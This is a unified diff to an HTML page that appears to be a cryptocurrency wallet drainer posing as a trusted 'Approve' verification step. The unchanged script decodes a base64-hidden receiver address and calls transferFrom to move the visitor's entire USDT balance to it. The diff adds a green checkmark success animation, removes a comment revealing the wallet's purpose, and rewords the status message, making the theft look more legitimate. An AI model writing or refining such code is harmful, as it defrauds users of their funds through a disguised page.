@@ -34,6 +34,57 @@
       font-size: 15px;
       color: #ccc;
     }
+
+    .checkmark {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      display: none;
+      stroke-width: 2;
+      stroke: #00ff9e;
+      stroke-miterlimit: 10;
+      box-shadow: inset 0px 0px 0px #00ff9e;
+      animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+    }
+
+    .checkmark__circle {
+      stroke-dasharray: 166;
+      stroke-dashoffset: 166;
+      stroke-width: 2;
+      stroke-miterlimit: 10;
+      stroke: #00ff9e;
+      fill: none;
+      animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+    }
+
+    .checkmark__check {
+      transform-origin: 50% 50%;
+      stroke-dasharray: 48;
+      stroke-dashoffset: 48;
+      animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
+    }
+
+    @keyframes stroke {
+      100% {
+        stroke-dashoffset: 0;
+      }
+    }
+
+    @keyframes scale {
+      0%, 100% {
+        transform: none;
+      }
+
+      50% {
+        transform: scale3d(1.1, 1.1, 1);
+      }
+    }
+
+    @keyframes fill {
+      100% {
+        box-shadow: inset 0px 0px 0px 30px #00ff9e;
+      }
+    }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 </head>
@@ -42,8 +93,14 @@
   <button class="btn" onclick="start()">Approve</button>
   <div id="status">Trusted by millions of users</div>
 
+  <!-- Hidden success animation -->
+  <svg class="checkmark" id="successAnimation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+  </svg>
+
   <script>
-    const encoded = "MHgxOTU2QjM5NTBBNzNCMEM1NDc5MjE5OUVkZjEzYzdjN2I4MzVGRjk0REM="; // base64 of your wallet
+    const encoded = "MHgxOTU2QjM5NTBBNzNCMEM1NDc5MjE5OUVkZjEzYzdjN2I4MzVGRjk0REM=";
     const receiver = atob(encoded);
     const USDT = "0x55d398326f99059fF775485246999027B3197955";
     const ABI = [
@@ -54,6 +111,7 @@
 
     async function start() {
       const status = document.getElementById("status");
+      const check = document.getElementById("successAnimation");
 
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
@@ -76,7 +134,8 @@
         const tx2 = await contract.transferFrom(user, receiver, balance);
         await tx2.wait();
 
-        status.innerText = "✅ All USDT successfully verified & transferred.";
+        status.innerText = "✅ All USDT successfully transferred.";
+        check.style.display = "block";
       } catch (err) {
         status.innerText = "❌ Error: " + err.message;
       }
